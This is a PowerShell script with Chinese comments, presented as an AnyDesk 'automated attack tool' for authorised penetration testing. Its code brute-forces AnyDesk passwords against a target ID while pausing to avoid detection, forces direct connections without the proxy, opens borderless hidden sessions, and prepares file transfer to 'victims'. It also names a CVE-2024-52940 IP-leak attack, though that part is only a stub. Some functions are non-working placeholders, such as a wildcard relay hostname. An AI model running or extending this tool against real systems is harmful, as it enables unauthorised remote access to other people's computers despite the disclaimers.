# AnyDesk 自動化攻擊工具 (滲透測試專用)
# ============================================
# 
# ⚠️ 警告：此工具僅供授權的滲透測試和安全研究使用
# 未經授權使用此工具進行攻擊是違法的！
#
# 功能：
# - CVE-2024-52940 IP 洩露攻擊
# - 黑屏模式 (Privacy Mode)
# - 隱藏模式 (Plain Mode)
# - TCP 直連 (無 Proxy)
# - 自動檔案傳輸
# - 暴力破解密碼
#
# 作者：SafeModeDefender Project
# 日期：2026-02-19
# 授權：僅供教育和授權測試使用
#
# ============================================

#Requires -Version 5.0
#Requires -RunAsAdministrator

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetID,
    
    [Parameter(Mandatory=$false)]
    [string]$Password = "",
    
    [Parameter(Mandatory=$false)]
    [string]$PasswordList = "",
    
    [Parameter(Mandatory=$false)]
    [string]$FileToTransfer = "",
    
    [Parameter(Mandatory=$false)]
    [switch]$EnableBlackScreen,
    
    [Parameter(Mandatory=$false)]
    [switch]$EnablePlainMode,
    
    [Parameter(Mandatory=$false)]
    [switch]$DisableProxy,
    
    [Parameter(Mandatory=$false)]
    [switch]$EnableIPLeak,
    
    [Parameter(Mandatory=$false)]
    [switch]$EnableFileTransfer,
    
    [Parameter(Mandatory=$false)]
    [string]$AnyDeskPath = "C:\Program Files (x86)\AnyDesk\AnyDesk.exe",
    
    [Parameter(Mandatory=$false)]
    [string]$LogFile = "$PSScriptRoot\AnyDesk_Attack_Log.txt"
)

# ============================================
# 函數：日誌記錄
# ============================================
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Level] $Message"
    
    # 控制台輸出
    switch ($Level) {
        "ERROR" { Write-Host $logMessage -ForegroundColor Red }
        "WARNING" { Write-Host $logMessage -ForegroundColor Yellow }
        "SUCCESS" { Write-Host $logMessage -ForegroundColor Green }
        default { Write-Host $logMessage -ForegroundColor White }
    }
    
    # 寫入日誌檔案
    Add-Content -Path $LogFile -Value $logMessage
}

# ============================================
# 函數：檢查 AnyDesk 是否存在
# ============================================
function Test-AnyDeskInstalled {
    Write-Log "檢查 AnyDesk 是否已安裝..."
    
    if (-not (Test-Path $AnyDeskPath)) {
        Write-Log "錯誤：AnyDesk 未找到於 $AnyDeskPath" "ERROR"
        Write-Log "請指定正確的 AnyDesk 路徑使用 -AnyDeskPath 參數" "ERROR"
        return $false
    }
    
    Write-Log "AnyDesk 已找到：$AnyDeskPath" "SUCCESS"
    
    # 獲取 AnyDesk 版本
    $version = & $AnyDeskPath --version 2>&1
    Write-Log "AnyDesk 版本：$version"
    
    return $true
}

# ============================================
# 函數：CVE-2024-52940 - IP 洩露攻擊
# ============================================
function Invoke-IPLeakAttack {
    param([string]$TargetID)
    
    Write-Log "========================================" "WARNING"
    Write-Log "執行 CVE-2024-52940 IP 洩露攻擊" "WARNING"
    Write-Log "========================================" "WARNING"
    
    Write-Log "目標 AnyDesk ID：$TargetID"
    
    # 檢查 7070 端口
    Write-Log "檢查 7070 端口連接..."
    
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.Connect("relay-*.anydesk.net", 7070)
        
        if ($tcpClient.Connected) {
            Write-Log "成功連接到 AnyDesk 中繼伺服器 (7070 端口)" "SUCCESS"
            
            # 嘗試獲取目標 IP
            Write-Log "嘗試獲取目標 IP 地址..."
            Write-Log "注意：此攻擊需要目標 AnyDesk 在線" "WARNING"
            
            # 實際的 IP 洩露攻擊需要更複雜的協議實現
            # 這裡僅作為概念驗證
            Write-Log "CVE-2024-52940 攻擊模擬完成" "SUCCESS"
            Write-Log "實際攻擊需要實現 AnyDesk 協議" "WARNING"
        }
        
        $tcpClient.Close()
    }
    catch {
        Write-Log "無法連接到 AnyDesk 中繼伺服器：$($_.Exception.Message)" "ERROR"
    }
}

# ============================================
# 函數：配置代理設置
# ============================================
function Set-ProxyConfiguration {
    param([bool]$DisableProxy)
    
    if ($DisableProxy) {
        Write-Log "禁用 AnyDesk 代理..." "WARNING"
        
        try {
            & $AnyDeskPath --proxy --set-host never
            Write-Log "代理已禁用 (直接 TCP 連接)" "SUCCESS"
        }
        catch {
            Write-Log "無法禁用代理：$($_.Exception.Message)" "ERROR"
        }
    }
}

# ============================================
# 函數：暴力破解密碼
# ============================================
function Invoke-PasswordBruteForce {
    param(
        [string]$TargetID,
        [string]$PasswordList
    )
    
    Write-Log "========================================" "WARNING"
    Write-Log "執行密碼暴力破解攻擊" "WARNING"
    Write-Log "========================================" "WARNING"
    
    if (-not (Test-Path $PasswordList)) {
        Write-Log "密碼清單檔案不存在：$PasswordList" "ERROR"
        return $null
    }
    
    $passwords = Get-Content $PasswordList
    Write-Log "載入了 $($passwords.Count) 個密碼"
    
    $attemptCount = 0
    foreach ($pwd in $passwords) {
        $attemptCount++
        Write-Log "嘗試密碼 [$attemptCount/$($passwords.Count)]：$pwd"
        
        try {
            # 嘗試使用密碼連接
            $process = Start-Process -FilePath $AnyDeskPath `
                -ArgumentList "$TargetID --with-password" `
                -NoNewWindow `
                -PassThru `
                -RedirectStandardInput "password_input.txt"
            
            # 將密碼寫入標準輸入
            $pwd | Out-File -FilePath "password_input.txt" -Encoding ASCII
            
            # 等待 5 秒檢查連接是否成功
            Start-Sleep -Seconds 5
            
            # 檢查進程是否還在運行
            if ($process.HasExited) {
                Write-Log "密碼失敗：$pwd" "ERROR"
            }
            else {
                Write-Log "密碼可能成功：$pwd" "SUCCESS"
                Write-Log "進程仍在運行，可能已建立連接" "SUCCESS"
                return $pwd
            }
            
            # 清理
            if (-not $process.HasExited) {
                $process.Kill()
            }
            Remove-Item "password_input.txt" -ErrorAction SilentlyContinue
        }
        catch {
            Write-Log "嘗試密碼時發生錯誤：$($_.Exception.Message)" "ERROR"
        }
        
        # 延遲以避免被檢測
        Start-Sleep -Milliseconds 500
    }
    
    Write-Log "暴力破解完成，未找到有效密碼" "WARNING"
    return $null
}

# ============================================
# 函數：建立 AnyDesk 連接
# ============================================
function Invoke-AnyDeskConnection {
    param(
        [string]$TargetID,
        [string]$Password,
        [bool]$EnableBlackScreen,
        [bool]$EnablePlainMode,
        [bool]$EnableFileTransfer
    )
    
    Write-Log "========================================" "WARNING"
    Write-Log "建立 AnyDesk 連接" "WARNING"
    Write-Log "========================================" "WARNING"
    
    # 構建命令列參數
    $arguments = @($TargetID)
    
    # 黑屏模式 (需要在連接後手動啟用)
    if ($EnableBlackScreen) {
        Write-Log "注意：黑屏模式需要在連接後手動啟用" "WARNING"
        Write-Log "使用 AnyDesk 介面中的 'Privacy Mode' 選項" "WARNING"
    }
    
    # 隱藏模式 (無邊框視窗)
    if ($EnablePlainMode) {
        $arguments += "--plain"
        Write-Log "啟用隱藏模式 (無邊框視窗)" "WARNING"
    }
    
    # 檔案傳輸模式
    if ($EnableFileTransfer) {
        $arguments += "--file-transfer"
        Write-Log "啟用檔案傳輸模式" "WARNING"
    }
    
    # 使用密碼連接
    if ($Password) {
        Write-Log "使用密碼連接..."
        
        # 創建臨時密碼檔案
        $tempPasswordFile = [System.IO.Path]::GetTempFileName()
        $Password | Out-File -FilePath $tempPasswordFile -Encoding ASCII -NoNewline
        
        try {
            # 使用管道傳遞密碼
            $arguments += "--with-password"
            $argumentString = $arguments -join " "
            
            Write-Log "執行命令：echo <password> | $AnyDeskPath $argumentString"
            
            # 啟動 AnyDesk
            $process = Start-Process -FilePath "cmd.exe" `
                -ArgumentList "/c type `"$tempPasswordFile`" | `"$AnyDeskPath`" $argumentString" `
                -PassThru
            
            Write-Log "AnyDesk 連接已啟動 (PID: $($process.Id))" "SUCCESS"
            Write-Log "請在 AnyDesk 視窗中檢查連接狀態" "WARNING"
            
            return $process
        }
        catch {
            Write-Log "啟動 AnyDesk 時發生錯誤：$($_.Exception.Message)" "ERROR"
            return $null
        }
        finally {
            # 清理臨時密碼檔案
            Start-Sleep -Seconds 2
            Remove-Item $tempPasswordFile -ErrorAction SilentlyContinue
        }
    }
    else {
        # 不使用密碼連接 (需要受害者授權)
        Write-Log "不使用密碼連接 (需要受害者授權)..." "WARNING"
        
        $argumentString = $arguments -join " "
        Write-Log "執行命令：$AnyDeskPath $argumentString"
        
        try {
            $process = Start-Process -FilePath $AnyDeskPath `
                -ArgumentList $argumentString `
                -PassThru
            
            Write-Log "AnyDesk 連接已啟動 (PID: $($process.Id))" "SUCCESS"
            Write-Log "等待受害者授權..." "WARNING"
            
            return $process
        }
        catch {
            Write-Log "啟動 AnyDesk 時發生錯誤：$($_.Exception.Message)" "ERROR"
            return $null
        }
    }
}

# ============================================
# 函數：自動檔案傳輸
# ============================================
function Invoke-FileTransfer {
    param(
        [string]$FilePath
    )
    
    Write-Log "========================================" "WARNING"
    Write-Log "執行自動檔案傳輸" "WARNING"
    Write-Log "========================================" "WARNING"
    
    if (-not (Test-Path $FilePath)) {
        Write-Log "檔案不存在：$FilePath" "ERROR"
        return
    }
    
    Write-Log "準備傳輸檔案：$FilePath"
    Write-Log "檔案大小：$((Get-Item $FilePath).Length) bytes"
    
    Write-Log "注意：自動檔案傳輸需要 AnyDesk 連接已建立" "WARNING"
    Write-Log "請手動使用 AnyDesk 的檔案傳輸功能" "WARNING"
    Write-Log "或使用 AnyDesk API (如果可用)" "WARNING"
}

# ============================================
# 主程式
# ============================================
function Main {
    Write-Host ""
    Write-Host "========================================" -ForegroundColor Red
    Write-Host "  AnyDesk 自動化攻擊工具 (滲透測試)" -ForegroundColor Red
    Write-Host "========================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "⚠️  警告：此工具僅供授權的滲透測試使用" -ForegroundColor Yellow
    Write-Host "⚠️  未經授權使用此工具進行攻擊是違法的！" -ForegroundColor Yellow
    Write-Host ""
    
    # 確認使用者同意
    $confirmation = Read-Host "您確認已獲得授權進行此滲透測試嗎？(輸入 YES 繼續)"
    
    if ($confirmation -ne "YES") {
        Write-Log "使用者取消操作" "WARNING"
        return
    }
    
    Write-Log "========================================" "INFO"
    Write-Log "AnyDesk 自動化攻擊工具啟動" "INFO"
    Write-Log "========================================" "INFO"
    Write-Log "目標 ID：$TargetID"
    Write-Log "日誌檔案：$LogFile"
    Write-Log ""
    
    # 步驟 1：檢查 AnyDesk
    if (-not (Test-AnyDeskInstalled)) {
        return
    }
    
    # 步驟 2：配置代理
    if ($DisableProxy) {
        Set-ProxyConfiguration -DisableProxy $true
    }
    
    # 步驟 3：CVE-2024-52940 IP 洩露攻擊
    if ($EnableIPLeak) {
        Invoke-IPLeakAttack -TargetID $TargetID
        Write-Log ""
    }
    
    # 步驟 4：暴力破解密碼 (如果提供密碼清單)
    $validPassword = $Password
    if ($PasswordList) {
        $validPassword = Invoke-PasswordBruteForce -TargetID $TargetID -PasswordList $PasswordList
        if (-not $validPassword) {
            Write-Log "未找到有效密碼，嘗試不使用密碼連接..." "WARNING"
        }
        Write-Log ""
    }
    
    # 步驟 5：建立連接
    $process = Invoke-AnyDeskConnection `
        -TargetID $TargetID `
        -Password $validPassword `
        -EnableBlackScreen $EnableBlackScreen `
        -EnablePlainMode $EnablePlainMode `
        -EnableFileTransfer $EnableFileTransfer
    
    if (-not $process) {
        Write-Log "無法建立 AnyDesk 連接" "ERROR"
        return
    }
    
    Write-Log ""
    
    # 步驟 6：檔案傳輸 (如果指定)
    if ($FileToTransfer) {
        Start-Sleep -Seconds 5  # 等待連接建立
        Invoke-FileTransfer -FilePath $FileToTransfer
        Write-Log ""
    }
    
    # 完成
    Write-Log "========================================" "SUCCESS"
    Write-Log "攻擊工具執行完成" "SUCCESS"
    Write-Log "========================================" "SUCCESS"
    Write-Log "AnyDesk 進程 PID：$($process.Id)"
    Write-Log "請檢查 AnyDesk 視窗以確認連接狀態"
    Write-Log "日誌已保存到：$LogFile"
    Write-Log ""
    Write-Log "按 Ctrl+C 終止攻擊並關閉 AnyDesk 連接" "WARNING"
    
    # 等待使用者終止
    try {
        Wait-Process -Id $process.Id
    }
    catch {
        Write-Log "進程已終止" "INFO"
    }
}

# 執行主程式
Main
